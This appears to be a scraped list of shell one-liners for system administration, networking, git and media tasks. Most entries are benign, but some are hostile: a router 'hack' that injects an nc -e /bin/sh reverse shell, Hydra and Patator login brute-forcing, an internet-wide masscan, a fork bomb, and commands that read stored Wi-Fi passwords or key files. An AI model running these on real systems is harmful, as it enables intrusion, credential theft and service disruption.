(*) Get a list of top 1000 sites from alexa: `curl -qsSl http://s3.amazonaws.com/alexa-static/top-1m.csv.zip 2>/dev/null | zcat | grep ".de$" | head -1000 | awk -F, '{print $2}'`
(*) Print all git repos from a user: `curl -s https://api.github.com/users/<username>/repos?per_page=1000 |grep git_url |awk '{print $2}'| sed 's/"\(.*\)",/\1/'`
(*) Print all git repos from a user (only curl and grep): `curl -s https://api.github.com/users/<username>/repos?per_page=1000 | grep -oP '(?<="git_url": ").*(?="\,)'`
(*) Print all git repos from a user: `curl -s "https://api.github.com/users/<username>/repos?per_page=1000" | jq '.[].git_url'`
(*) Print all git repos from a user: `curl -s "https://api.github.com/users/<username>/repos?per_page=1000" | python <(echo "import json,sys;v=json.load(sys.stdin);for i in v:; print(i['git_url']);" | tr ';' '\n')`
(*) Get Your IP Geographic Location with curl and jq: `curl -s https://ipvigilante.com/$(curl -s https://ipinfo.io/ip) | jq '.data.latitude, .data.longitude, .data.city_name, .data.country_name'`
(*) Get current stable kernel version string from kernel.org: `curl -s https://www.kernel.org/releases.json | jq '.latest_stable.version' -r`
(*) Check every URL redirect (HTTP status codes 301/302) with curl: `curl -sLkIv --stderr - http://example.org | grep -i location: | awk {'print $3'} | sed '/^$/d'`
(*) Check every URL redirect (HTTP status codes 301/302) with curl: `curl -sLkIv --stderr - https://exemple.com | awk 'BEGIN{IGNORECASE = 1};/< location:/ {print $3}'`
(*) Extract column from csv file: `cut -d"," -f9`
(*) Generate random mac-address using md5sum + sed: `date | md5sum | sed -r 's/(..){3}/\1:/g;s/\s+-$//'`
(*) Poor man's ntpdate: `date -s "$(curl -sD - www.example.com | grep '^Date:' | cut -d' ' -f3-6)Z"`
(*) Iso to USB with dd and show progress status: `dd if=/backup/archlinux.iso of=/dev/sdb status=progress`
(*) Iso to USB with dd and show progress status: `dd if=/home/kozanoglu/Downloads/XenServer-7.2.0-install-cd.iso | pv --eta --size 721420288 --progress --bytes --rate --wait > /dev/sdb`
(*) Hide or show Desktop Icons on MacOS: `defaults write com.apple.finder CreateDesktop -bool false;killall Finder`
(*) Find German synonyms using OpenThesaurus: `desyno(){ wget -q -O- https://www.openthesaurus.de/synonyme/search\?q\="$*"\&format\=text/xml | sed 's/>/>\n/g' | grep "<term term=" | cut -d \' -f 2 | paste -s -d , | sed 's/,/, /g' | fold -s -w $(tput cols); }`
(*) Get partitions that are over 50% usage: `df -h |awk '{a=$5;gsub(/%/,"",a);if(a > 50){print $0}}'`
(*) Show allocated disk space:: `df -klP -t xfs -t ext2 -t ext3 -t ext4 -t reiserfs | grep -oE ' [0-9]{1,}( +[0-9]{1,})+' | awk '{sum_used += $1} END {printf "%.0f GB\n", sum_used/1024/1024}'`
(*) Show used disk space:: `df -klP -t xfs -t ext2 -t ext3 -t ext4 -t reiserfs | grep -oE ' [0-9]{1,}( +[0-9]{1,})+' | awk '{sum_used += $2} END {printf "%.0f GB\n", sum_used/1024/1024}'`
(*) Update all Docker Images: `docker images --format "{{.Repository}}:{{.Tag}}" | grep ':latest' | xargs -L1 docker pull`
(*) List all ubuntu installed packages in a single line: `dpkg --get-selections | grep -Evw 'deinstall$' | cut -f1 | sort -u | xargs`
(*) List all ubuntu installed packages in a single line: `dpkg --get-selections | grep -v deinstall | sort -u | cut -f 1 | tr '\r\n' ' ' | sed '$s/ $/\n/'`
(*) Get the full description of a randomly selected package from the list of installed packages on a debian system: `dpkg-query --status $(dpkg --get-selections | awk '{print NR,$1}' | grep -oP "^$( echo $[ ( ${RANDOM} % $(dpkg --get-selections| wc -l) + 1 ) ] ) \K.*")`
(*) Determine if booted as EFI/UEFI or BIOS: `[[ -d "/sys/firmware/efi" ]] && echo "UEFI" || echo "BIOS"`
(*) List the size (in human readable form) of all sub folders from the current location: `du -h -d1`
(*) Du command without showing other mounted file systems: `du -h --max-depth=1 --one-file-system /`
(*) List the size (in human readable form) of all sub folders from the current location: `du -sh *`
(*) Get total of inodes of root partition: `du --total --inodes / | egrep 'total$'`
(*) Get a rough estimate about how much disk space is used by all the currently installed debian packages: `echo $[ ($(dpkg-query -s $(dpkg --get-selections | grep -oP '^.*(?=\binstall)') | grep -oP '(?<=Installed-Size: )\d+' | tr '\n' '+' | sed 's/+$//')) / 1024 ]`
(*) Random number with a normal distribution between 1 and X: `echo $[(${RANDOM}%100+${RANDOM}%100)/2+1]`
(*) Simplest calculator: `echo $[321*4]`
(*) Automatically generate the ip/hostname entry for the /etc/hosts in the current system: `echo "$(ip addr show dev $(ip r | grep -oP 'default.*dev \K\S*') | grep -oP '(?<=inet )[^/]*(?=/)') $(hostname -f) $(hostname -s)"`
(*) Generate a sequence of numbers.: `echo {1..12}`
(*) Generate a sequence of numbers.: `echo {1..99}`
(*) Colorize sequences of digits: `echo abcd89efghij340.20kl|grep --color -e "[0-9]\+" -e "$"`
(*) Produce 10 copies of the same string: `echo boo{,,,,,,,,,,}`
(*) Replace all backward slashes with forward slashes: `echo 'C:\Windows\' | sed 's|\\|\/|g'`
(*) Check if port is open on remote machine: `echo >  /dev/tcp/127.0.0.123/8085 && echo "Port is open"`
(*) Hiding ur evil intent!  Shame on you!: `echo 'doing something very evil' >/dev/null && echo doing something very nice!`
(*) Check web server port 80 response header: `(echo -e 'GET / HTTP/1.0\r\n\r\n';) | ncat <IPaddress> 80`
(*) Change user password  one liner: `echo -e "linuxpassword\nlinuxpassword" | passwd linuxuser`
(*) Fork bomb (don't actually execute): `echo -e â€œ\x23\x21/bin/bash\n\.\/\$\0\&\n\.\/\$\0\&â€ > bomb.sh && ./bomb.sh`
(*) From all PDF files in all subdirectories, extract two metadata fields (here: Creator and Producer) into a CSV table: `echo "File;Creator;Producer";find . -name '*.pdf' -print0 | while IFS= read -d $'\0' line;do echo -n "$line;";pdfinfo "$line"|perl -ne 'if(/^(Creator|Producer):\s*(.*)$/){print"$2";if ($1 eq "Producer"){exit}else{print";"}}';echo;done 2>/dev/null`
(*) Pretty print json block that has quotes escaped: `echo 'json_here' | sed 's/\\//g' | jq .`
(*) Instead of saying RTFM!: `echo "[q]sa[ln0=aln256%Pln256/snlbx]sb729901041524823122snlbxq"|dc`
(*) Test sendmail: `echo "Subject: test" | /usr/lib/sendmail -v me@domain.com`
(*) OSX script to change Terminal profiles based on machine name;  use with case statement parameter matching: `echo "tell application \"Terminal\"\n\t set its current settings of selected tab of window 1 to settings set \"$PROFILE\"\n end tell"|osascript;`
(*) Remove all the characters after last space per line including it: `echo 'The quick brown fox jumps over the lazy dog' | sed 's|\(.*\) .*|\1|'`
(*) Remove all the characters before last space per line including it: `echo 'The quick brown fox jumps over the lazy dog' | sed 's|.* ||'`
(*) Set a user password without passwd: `echo 'user:newpassword' | chpasswd`
(*) Replace all forward slashes with backward slashes: `echo '/usr/bin/' | sed 's|\/|\\|g'`
(*) Download all recently uploaded pastes on pastebin.com: `elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget`
(*) Crash bash, in case you ever want to for whatever reason: `enable -f /usr/lib/libpng.so png_create_read`
(*) Save your current environment as a bunch of defaults: `env | sed 's/\(.*\)=\(.*\)/: ${\1:="\2"}/'  > mydefaults.bash`
(*) Color STDERR in output: `./errorscript.sh 2> >(echo "\e[0;41m$(cat)\e[0m")`
(*) Check whether laptop is running on battery or cable: `eval "$(printf "echo %s \$((%i * 100 / %i))\n" $(cat $(find /sys -name energy_now 2>/dev/null | head -1 | xargs dirname)/{status,energy_{now,full}}))%"`
(*) Unset all http proxy related environment variables in one go in the current shell: `eval "unset $(printenv | grep -ioP '(?:https?|no)_proxy' | tr '\n' ' ')"`
(*) Create a nicely formatted example of a shell command and its output: `example() { echo "EXAMPLE:"; echo; echo "    $@"; echo; echo "OUTPUT:"; echo ; eval "$@" | sed 's/^/    /';  }`
(*) Set pcap & SUID Bit for priv. network programs (like nmap): `export BIN=`which nmap` && sudo setcap cap_net_raw,cap_net_admin+eip $BIN && sudo chown root $BIN && sudo chmod u+s $BIN`
(*) Store Host IP in variable: `export IP="$(hostname -I | awk '{print $1}')"`
(*) This will take the last two commands from bash_history and  open your editor with the commands on separated lines: `fc -1 -2`
(*) Downmix first audio stream from 7.1 to 5.1 keeping all other streams: `ffmpeg -i in.mkv -map 0 -c copy -c:a:0 aac -ac:a:0 6 out.mkv`
(*) Rotate a video file by 90 degrees CW: `ffmpeg -i in.mov -c copy -metadata:s:v:0 rotate=90 out.mov`
(*) Rotate a video file by 90 degrees CW: `ffmpeg -i in.mov -vf "transpose=1" out.mov`
(*) Download screenshot or frame from YouTube video at certain timestamp: `ffmpeg -ss 8:14 -i $(youtube-dl -f 299 --get-url URL) -vframes 1 -q:v 2 out.jpg`
(*) Capture video of a linux desktop: `ffmpeg -video_size 1024x768 -framerate 25 -f x11grab -i :0.0+100,200 output.mp4`
(*) List human readable files: `file *|grep 'ASCII text'|sort  -rk2`
(*) Rename / move Uppercase filenames to lowercase filenames current directory: `FileList=$(ls); for FName in $FileList; do LowerFName=$(echo "$FName" | tr '[:upper:]' '[:lower:]'); echo $FName" rename/move to $LowerFName"; mv $FName $LowerFName;  done`
(*) PHP7 - Fix incompatibility errors like: Parse error: syntax error, unexpected new (T_NEW) in file.php on line...: `find "$(realpath ./)" -type f \( -iname "*.php" -or -iname "*.inc" \) -exec sed -i -r "s~=[[:space:]]*&[[:space:]]*new[[:space:]]+~= new ~gi" {} \;`
(*) Edit, view or execute last modified file with a single key-press: `f() { ls -lart;e="ls -tarp|grep -v /|tail -9";j=${e/9/1};g=${e/9/9|nl -nln};h=$(eval $j);eval $g;read -p "e|x|v|1..9 $(eval $j)?" -n 1 -r;case $REPLY in e) joe $h;;v)cat $h;;x) eval $h;;[1-9]) s=$(eval $g|egrep ^$REPLY) && touch "${s:7}" && f;;esac ; }`
(*) Visual alert with keyboard LEDs: `for a in $(seq 16); do xdotool key Num_Lock;sleep .5; xdotool key Caps_Lock;done`
(*) Save a copy of all debian packages in the form in which they are installed and configured on your system: `for a in $(sudo dpkg --get-selections|cut -f1); do dpkg-repack $a|awk '{if (system("sleep .5 && exit 2") != 2) exit; print}';done`
(*) Switch all connected PulseAudio bluetooth devices to A2DP profile: `for card in $(pacmd list-cards | grep 'name: ' | sed 's/.*<\(.*\)>.*/\1/'); do pacmd set-card-profile $card a2dp_sink; done`
(*) Silently deletes lines containing a specific string in a bunch of files: `for file in $(egrep 'abc|def' *.sql | cut -d":" -f1 | uniq); do    sed -i '/abc/d' ./$file ; sed -i '/def/d' ./$file; done`
(*) Find a file and then copy to tmp folder: `for file in `ls | grep -i 'mumbai|pune|delhi'` ; do cp $file /tmp/Â ; doneÂ `
(*) Massive change of file extension (bash): `for file in *.txt; do mv "$file" "${file%.txt}.xml"; done`
(*) Massive change of file extension (bash): `for file in *.txt; do mv "${file%.txt}{.txt,.xml}"; done`
(*) Rename all files in lower case: `for f in `find`; do mv -v "$f" "`echo $f | tr '[A-Z]' '[a-z]'`"; done`
(*) Tar and bz2 a set of folders as individual files: `for f in *screenflow ; do tar cvf "$f.tar.bz2" "$f"; done`
(*) Make a dedicated folder for each zip file: `for f in *.zip; do unzip -d "${f%*.zip}" "$f"; done`
(*) Shell bash iterate number range with for loop: `for((i=1;i<=10;i++)){ echo $i; }`
(*) Generate a sequence of numbers.: `for ((i=1; i<=99; ++i)); do echo $i; done`
(*) Block all IPv4 addresses that has brute forcing our ssh server: `for idiots in "$(cat /var/log/auth.log|grep invalid| grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b')"; do iptables -A INPUT -s "$idiots" -j DROP; done`
(*) Download all default installed apk files from your android.: `for i in $(adb shell pm list packages | awk -F':' '{print $2}'); do adb pull "$(adb shell pm path $i | awk -F':' '{print $2}')"; mv *.apk $i.apk 2&> /dev/null ;done`
(*) Shell bash iterate number range with for loop: `for i in $(seq 1 5) ; do echo $i ; done`
(*) Shell bash iterate number range with for loop: `for i in {1..10}; do echo $i; done`
(*) Quickly ping range of IP adresses and return only those that are online: `{ for i in {1..254}; do ping -c 1 -W 1  192.168.1.$i & done } | grep "64 bytes"`
(*) Scan all open ports without any required program: `for i in {1..65535}; do (echo < /dev/tcp/127.0.0.1/$i) &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done`
(*) Download all .key files from your android device to your pc.: `for i in `adb shell "su -c find /data /system -name '*.key'"`; do mkdir -p ".`dirname $i`";adb shell "su -c cat $i" > ".$i";done`
(*) Convert raw camera image to jpeg: `for i in *.CR2; do ufraw-batch $i --out-type=jpeg --output $i.jpg; done;`
(*) Individually 7zip all files in current directory: `for i in *.*; do 7z a "$i".7z "$i"; done`
(*) Rename all files in a directory to the md5 hash: `for i in *; do sum=$(md5sum $i); mv  -- "$i" "${sum%% *}"; done`
(*) Checks size of directory & delete it if its to small: `for i in *;  do test -d "$i" && ( rclone size "$i" --json -L 2> /dev/null | jq --arg path "$i" 'if .bytes < 57462360 then ( { p: $path , b: .bytes}) else "none" end' | grep -v none | jq -r '.p' | parallel -j3 rclone purge "{}" -v -P ); done`
(*) Get all Google ipv4/6 subnets for a iptables firewall for example (updated version): `for NETBLOCK in $(echo _netblocks.google.com _netblocks2.google.com _netblocks3.google.com); do nslookup -q=TXT $NETBLOCK ; done | tr " " "\n" | grep ^ip[46]: | cut -d: -f2- | sort`
(*) WSL: Change the current directory converting a Windows path to a Linux Path: `function _cd() { local dir; dir="$(sed -e 's~\([a-z]\):~/mnt/\L\1~gi' <<< "${*//'\'/"/"}" )"; if [ -d "$dir" ]; then cd "$dir" || exit; fi; }`
(*) Uniquely (sort of) color text so you can see changes: `function colorify() { n=$(bc <<< "$(echo ${1}|od -An -vtu1 -w100000000|tr -d ' ') % 7"); echo -e "\e[3${n}m${1}\e[0m"; }`
(*) Worse alternative to <ctrl+r>: `function memo() { awk '! seen[$0]++' <<< $(grep -i "$@" ~/.bash_history ); }`
(*) Autocomplete directories (CWDs) of other ZSH processes (MacOS version): `function _xterm_cwds() { for pid in $(pgrep -x zsh); do reply+=$(lsof -p $pid | grep cwd | awk '{print $9}') done }; function xcd() { cd $1 }; compctl -K _xterm_cwds xcd`
(*) Pull multiple repositories in child folders (a.k.a. I'm back from leave script) [Windows]: `gci -Directory | foreach {Push-Location $_.Name; git fetch --all; git checkout master; git pull; Pop-Location}`
(*) Powershell one-line script to remove the bracketed date from filenames: `Get-ChildItem -Recurse | Where-Object { $_.Name -match " ?\(\d\d\d\d_\d\d_\d\d \d\d_\d\d_\d\d UTC\)" } | Rename-Item -NewName { $_.Name -replace " ?\(\d\d\d\d_\d\d_\d\d \d\d_\d\d_\d\d UTC\)", ""}`
(*) Delete all local git branches that have been merged and deleted from remote: `git branch -d $( git branch -vv | grep '\[[^:]\+: gone\]' | awk '{print $1}' | xargs )`
(*) Delete all local branches that have been merged into master [Windows]: `git branch --merged origin/master | Where-Object {  !$_.Contains('master') } | ForEach-Object { git branch -d $_.trim() }`
(*) Cleanup remote git repository of all branches already merged into master: `git branch --remotes --merged | grep -v master | sed 's@ origin/@:@' | xargs git push origin`
(*) Delete all local branches that are not master [Windows]: `git branch | Where-Object { !$_.Contains('master') } | ForEach-Object { git branch -D $_.Trim() }`
(*) Copy current branch to clipboard [Windows]: `(git branch | Where-Object { $_.Contains('*') } | Select-Object -First 1).Trim('*').Trim() | Set-Clipboard`
(*) Initialise git in working directory with latest Visual Studio .gitignore [Windows]: `git init; (Invoke-WebRequest https://raw.githubusercontent.com/github/gitignore/master/VisualStudio.gitignore -UseBasicParsing).Content | Out-File -FilePath .gitignore -Encoding utf8; git add -A`
(*) Get full git commit history of single file: `git log -p --name-only --follow <file>`
(*) Open browser from terminal to create PR after pushing something in Git in MAC: `git remote -v |grep origin|tail -1|awk '{print $2}'|cut -d"@" -f2|sed 's/:/\//g'|xargs -I {} open -a "Google Chrome" https://{}`
(*) Print github url for the current url: `git remote -v | sed -n '/github.com.*push/{s/^[^[:space:]]\+[[:space:]]\+//;s|git@github.com:|https://github.com/|;s/\.git.*//;p}'`
(*) Push to all (different) remotes in git directory without having to combine them.: `git remote | while read line ; do git push $line; done`
(*) Stage all files for commit except those that are *.config at any level within your git repo [Windows]: `git status | Where-Object {$_.Contains('modified') -and !$_.Contains('.config')} | ForEach-Object { git add $_.Replace('modified:','').Trim() }`
(*) Find out how much ram memory has your video (graphic) card: `glxinfo |grep -i -o 'device|memory\|[0-9]\{1,12\} MB'|head -n 1`
(*) Add a mysql user: `grant all on *.* to 'dba'@'localhost' identified by 'dba123' with grant option;`
(*) Colorize grep output: `grep --color -E 'pattern|$' file`
(*) Highlight with grep and still output file contents: `grep --color -E 'pattern|' file`
(*) Print hugepage consumption of each process: `grep -e AnonHugePages  /proc/*/smaps | awk  '{ if($2>4) print $0} ' |  awk -F "/" '{system("cat /proc/" $3 "/cmdline");printf("\n");print $0; printf("\n");}'`
(*) Find Apache Root document: `grep -e '^[[:blank:]]*DocumentRoot[[:blank:]]\S'`
(*) Extract email addresses from some file (or any other pattern): `grep -Eio '([[:alnum:]_.-]{1,64}@[[:alnum:]_.-]{1,252}?\.[[:alpha:].]{2,6})'`
(*) Extract queries from mysql general log: `grep -Eo '( *[^ ]* *){4}Invoice_Template( *[^ ]* *){4}' /mysql-bin-log/mysql-gen.log | head -10000 | sort -u`
(*) Get all lines that start with a dot or period: `grep '^\.' file`
(*) Grep for minus (-) sign: `grep -- -`
(*) Find passwords that has been stored as plain text in NetworkManager: `grep -H '^psk=' /etc/NetworkManager/system-connections/*`
(*) Find Apache Root document: `grep -i 'DocumentRoot' /usr/local/apache/conf/httpd.conf`
(*) Show OS release incl version.: `grep -m1 -h [0-9] /etc/{*elease,issue} 2>/dev/null | head -1`
(*) Delete at start of each line until character: `grep -Po '^(.*?:\K)?.*'`
(*) Get rid of lines with non ascii characters: `grep -v $'[^\t\r -~]' my-file-with-non-ascii-characters`
(*) Reduce PDF Filesize: `gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dBATCH  -dQUIET  -dColorImageResolution=600 -dMonoImageResolution=600 -sOutputFile=output.pdf input.pdf`
(*) IBM AIX: Extract a .tar.gz archive in one shot: `gunzip -c file.tar.gz | tar -xvf -`
(*) Factory reset your harddrive. (BE CAREFUL!): `hdparm --yes-i-know-what-i-am-doing --dco-restore /dev/sdX`
(*) Calculate the distance between two geographic coordinates points (latitude longitude): `h(){ echo $@|awk '{d($1,$2,$3,$4);} function d(x,y,x2,y2,a,c,dx,dy){dx=r(x2-x);dy=r(y2-y);x=r(x);x2=r(x2);a=(sin(dx/2))^2+cos(x)*cos(x2)*(sin(dy/2))^2;c=2*atan2(sqrt(a),sqrt(1-a)); printf("%.4f",6372.8*c);} function r(g){return g*(3.1415926/180.);}';}`
(*) Bruteforce Synology NAS Logins with Hydra: `hydra  -I -V -T 5 -t 2  -s 5001 -M /tmp/syno https-post-form '/webman/login.cgi?enable_syno_token=yes:username=^USER^&passwd=^PASS^&OTPcode=:S=true' -L ./ruby-syno-brut/user -P ruby-syno-brut/passlist-short-2.txt`
(*) Iso to USB with dd and show progress status: `image="file.iso";drive="/dev/null";sudo -- sh -c 'cat '"${image}"'|(pv -n -s $(stat --printf="%s" '"${image}"')|dd of='"${drive}"' obs=1M oflag=direct) 2>&1| dialog --gauge "Writing Image '"${image}"' to Drive '"${drive}"'" 10 70 7'`
(*) Block all brute force attacks in realtime (IPv4/SSH): `inotifywait -r -q --format %w /var/log/auth.log|grep -i "Failed pass"|tail -n 1|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}';iptables -I INPUT -i eth0 -s "$(cat /var/log/auth.log|grep "authentication failure; l"|awk -Frhost= '{print $2}'|tail -n 1)" -j DROP`
(*) To create files with specific permission:: `install -b -m 777 /dev/null file.txt`
(*) Show current network interface in use: `ip addr | awk '/state UP/ {print $2}' | sed 's/.$//'`
(*) Grep expression (perl regex) to extract all ip addresses from both ip and ifconfig commands output: `ip a | grep -oP '(?<=inet |addr:)(?:\d+\.){3}\d+'`
(*) Show your current network interface in use: `ip r show default | awk '{print $5}'`
(*) Keytool using BouncyCastle as security provider to add a X509 certificate: `keytool -importcert -providerpath bcprov-jdk15on-1.60.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider -storetype BCPKCS12 -trustcacerts -alias <alias> -file <filename.cer> -keystore <filename>`
(*) Keytool using BouncyCastle as security provider to add a PKCS12 certificate store: `keytool -importkeystore -providerpath bcprov.jar -provider BouncyCastleProvider -srckeystore <filename.pfx> -srcstoretype pkcs12 -srcalias <src-alias> -destkeystore <filename.ks> -deststoretype BCPKCS12 -destalias <dest-alias>`
(*) Keytool view all entries in a keystore with BouncyCastle as security provider: `keytool -list -providerpath bcprov-jdk15on-1.60.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider -storetype BCPKCS12 -storepass <passphrase> -keystore <filename>`
(*) Trim disk image for best compression before distributing: `kpartx -av disk.img && mkdir disk && mount /dev/mapper/loop0p1 disk && fstrim -v disk && umount disk && kpartx -d disk.img`
(*) Command shell generate random strong password: `len=20; tr -dc A-Za-z0-9_ < /dev/urandom | head -c ${len} | xargs`
(*) Countdown Clock: `let T=$(date +%s)+3*60;while [ $(date +%s) -le $T ]; do let i=$T-$(date +%s); echo -ne "\r$(date -d"0:0:$i" +%H:%M:%S)"; sleep 0.3; done`
(*) Listen to a song from youtube with youtube-dl and mpv: `listen-to-yt() { if [[ -z "$1" ]]; then echo "Enter a search string!"; else mpv "$(youtube-dl --default-search 'ytsearch1:' \"$1\" --get-url | tail -1)"; fi }`
(*) Display list of available printers: `lpstat -p`
(*) Slow Down Command Output: `ls -alt|awk '{if (system("sleep .5 && exit 2") != 2) exit; print}'`
(*) Listing todayâ€™s files only: `ls -al --time-style=+%D| grep `date +%D``
(*) Display information about the CPU: `lscpu | egrep 'Model name|Socket|Thread|NUMA|CPU\(s\)'`
(*) List current   processes  writing to hard drive: `lsof | grep -e "[[:digit:]]\+w"`
(*) Find wich ports you probably want to open in your firewall on a fresh installed machine: `lsof -i -nlP | awk '{print $9, $8, $1}' | sed 's/.*://' | sort -u`
(*) Find out  how much ram memory has your video (graphic) card: `lspci|grep -i "VGA Compatible Controller"|cut -d' ' -f1|xargs lspci -v -s|grep ' prefetchable'`
(*) Check a directory of PNG files for errors: `ls *.png |parallel --nice 19 --bar --will-cite "pngcheck -q {}"`
(*) List files size sorted and print total size in a human readable format without sort, awk and other commands.: `ls -sSh /path | head`
(*) Scan multiple log subdirectories for the latest log files and tail them: `ls /var/log/* -ld | tr -s " " | cut -d" " -f9 | xargs -i{} sh -c 'echo "\n---{}---\n"; tail -n50 {}/`ls -tr {} | tail -n1`'`
(*) List top 100 djs from https://djmag.com/top100djs: `lynx -listonly -nonumbers -dump https://djmag.com/top100djs|sed '1d'|cut -d- -f5,6,7|sed -n '180,$p'|nl --number-format=rn --number-width=3|sed 's/-/ /g'|sed -e 's/.*/\L&/' -e 's/\<./\u&/g'`
(*) Scan whole internet and specific port in humanistic time: `masscan 0.0.0.0/0 -p8080,8081,8082 --max-rate 100000 --banners --output-format grepable --output-filename /tmp/scan.xt --exclude 255.255.255.255`
(*) Create multiple subfolders in one command.: `mkdir -p /path/folder{1..4}`
(*) Create multiple subfolders in one command.: `mkdir -p /path/{folder1,folder2,folder3,folder4}`
(*) Create ext4 filesystem with big count of inodes: `mkfs.ext4 -T news /dev/sdcXX`
(*) Convert CSV to JSON with miller: `mlr --c2j --jlistwrap cat file.csv`
(*) Premiumize - create a ddl & save the URL in variable MYLINK: `MYLINK=$(curl  'https://www.premiumize.me/api/transfer/directdl?apikey=dzx3rqwrxme8iazu' \   -H 'accept: application/json' \   -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw 'src='$URL | jq -r '.content[] | .link' )`
(*) Mysql status: `mysqladmin status >> /home/status.txt 2>> /home/status_err.txt`
(*) InnoDB related parameters: `mysqladmin variables | egrep '(innodb_log_file|innodb_data_file)'`
(*) Mysql backup utility: `mysqlbackup --port=3306 --protocol=tcp --user=dba --password=dba Â --with-timestamp Â --backup-dir=/tmp/toback/ --slave-info backup-and-apply-log Â --innodb_data_file_path=ibdata1:10M:autoextend --innodb_log_files_in_group=2 --innodb_log_file_size=5242880`
(*) Reapair all mySQL/mariaDB databases: `mysqlcheck --repair --all-databases -u root -p<PASSWORD>`
(*) Monitor ETA using pv command: `mysqldump --login-path=mypath sbtest sbtest4 |  pv  --progress  --size  200m  -t  -e  -r  -a > dump.sql`
(*) Backup all data in compressed format: `mysqldump --routines --all-databases | gzip > /home/mydata.sql.gz 2>Â /home/mydata.date '+\%b\%d'.err`
(*) Check mysql server performance: `mysqlslap --query=/home/ec2-user/insert.txt --concurrency=123 --iterations=1 Â --create-schema=test`
(*) Check mysql capacity to handle traffic: `mysqlslapÂ  --query=/root/select_query_cp.sql --concurrency=10 --iterations=5Â  --create-schema=cvts1`
(*) Hacking the Technicolor TG799vac  (and unlocking features for openwrt): `::::::;nc 192.168.1.144 1337 -e /bin/sh;rm /etc/dropbear/*;uci set dropbear.lan.PasswordAuth='on';uci set dropbear.lan.RootPasswordAuth='on';uci set dropbear.lan.Interface='lan';uci set dropbear.lan.enable='1';/etc/init.d/dropbear restart; uci commit`
(*) Which processes are listening on a specific port (e.g. port 80): `netstat -nap|grep 80|grep LISTEN`
(*) Show which programs are listening on TCP ports: `netstat -tlpn`
(*) Nmap get all active online ips  from specific network: `nmap -n -sn 192.168.1.0/24 -oG - | awk '/Up$/{print $2}'`
(*) Dump top 10 ports tcp/udp from nmap: `nmap -oA derp --top-ports 10 localhost>/dev/null;grep 'services\=' derp.xml | sed -r 's/.*services\=\"(.*)(\"\/>)/\1/g'`
(*) Nmap fast scan all ports target: `nmap  -p0-65535 192.168.1.254 -T5`
(*) Network Discover in a one liner: `nmap -sn 192.168.1.0/24 -oG - | awk '$4=="Status:" && $5=="Up" {print $0}'|column -t`
(*) Display live hosts on the network: `nmap -sP "$(ip -4 -o route get 1 | cut -d ' ' -f 7)"/24 | grep report | cut -d ' ' -f 5-`
(*) Quickly ping range of IP adresses and return only those that are online: `nmap -sP 192.168.0.0/24`
(*) Show a prettified list of nearby wireless APs: `nmcli device wifi list`
(*) List all global top level modles, then remove ALL npm packages with xargs: `npm ls -gp --depth=0 | awk -F/ '/node_modules/ && !/\/npm$/ {print $NF}' | xargs npm -g rm; npm -g uninstall npm`
(*) Convert rich text on the clipboard to Markdown in OS X: `osascript -e'get the clipboard as"RTF "'|sed 's/Â«data RTF //;s/Â»//'|xxd -r -p|textutil -convert html -stdin -stdout|pandoc -f html -t markdown_strict --no-wrap --atx-headers`
(*) List the URLs of tabs of the frontmost Chrome window in OS X: `osascript -e{'set text item delimiters to linefeed','tell app"google chrome"to url of tabs of window 1 as text'}`
(*) Arch Linux: Search for missing libraries using pacman: `pacman -Fs libusb-0.1.so.4`
(*) Sort installed package on ArchLinux  from low to high: `pacman -Qi | egrep '^(Name|Installed)' | cut -f2 -d':' | paste - - | column -t | sort -nk 2 | grep MiB`
(*) PulseAudio: set the volume via command line: `pactl set-sink-volume @DEFAULT_SINK@ +5%`
(*) Converts all pngs in a folder to webp using all available cores: `parallel cwebp -q 80 {} -o {.}.webp ::: *.png`
(*) Fast portscanner via Parallel: `parallel -j200% -n1 -a textfile-with-hosts.txt nc -vz {} ::: 22`
(*) Patator: A Hydra brute force alternative: `patator ssh_login host=192.168.1.16 port=22 user=FILE0 0=user.lst password=FILE1 1=pass.lst -x ignore:mesg='Authentication failed.'`
(*) Create POSIX tar archive: `pax -wf archive.tar /path`
(*) Calculate the mean or average of a single column of numbers in a text file: `perl -lane '$total += $F[0]; END{print $total/$.}' single-column-numbers.txt`
(*) Uninstall bloatware on your android device without root.: `pm uninstall --user 0 com.package.name`
(*) Converts all pngs in a folder to webp, quality can be choosed as a argument: `pngwebp(){ arg1=$1  for i in *.png;   do name=`echo "${i%.*}"`;   echo $name;  cwebp -q $1 "${i}" -o "${name}.webp" done  }`
(*) Print CPU load in percent: `printf "1-minute load average: %.1f%%\n" \ $(bc <<<"$(cut -d ' ' -f 1 /proc/loadavg) * 100")`
(*) Alert visually until any key is pressed: `printf "\e[38;5;1m"; while true; do printf "\e[?5h A L E R T %s\n" "$(date)"; sleep 0.1; printf "\e[?5l"; read -r -s -n1 -t1 && printf "\e[39m" && break; done`
(*) Seconds since epoch to ISO timestamp: `printf '%(%FT%T)T\n' 1606752450`
(*) Check whether IPv6 is enabled: `printf "IPv6 is "; [ $(cat /proc/sys/net/ipv6/conf/all/disable_ipv6) -eq 0 ] && printf "enabled\n" || printf "disabled\n"`
(*) Draw line separator (using knoppix5 idea): `printf '*%.s' {1..40}; echo`
(*) Draw line separator (using knoppix5 idea): `printf "%.s*" {1..40}; printf "\n"`
(*) Make M-n, M-m, and M-, insert the zeroth, first, and second argument of the previous command in Bash: `printf %s\\n '"\en": "\e0\e."' '"\em": "\e1\e."' '"\e,": "\e2\e."'>>~/.inputrc`
(*) Print a horizontal line: `printf "%`tput cols`s"|sed "s/ /_/g"`
(*) Print a horizontal line: `printf -v _hr "%*s" $(tput cols) && echo ${_hr// /${1--}}`
(*) Sort processes by CPU Usage: `ps auxk -%cpu | head -n10`
(*) Top 10 Memory Processes (reduced output to applications and %usage only): `ps aux | sort -rk 4,4 | head -n 10 | awk '{print $4,$11}'`
(*) Top 10 Memory Processes: `ps aux | sort -rk 4,4 | head -n 10`
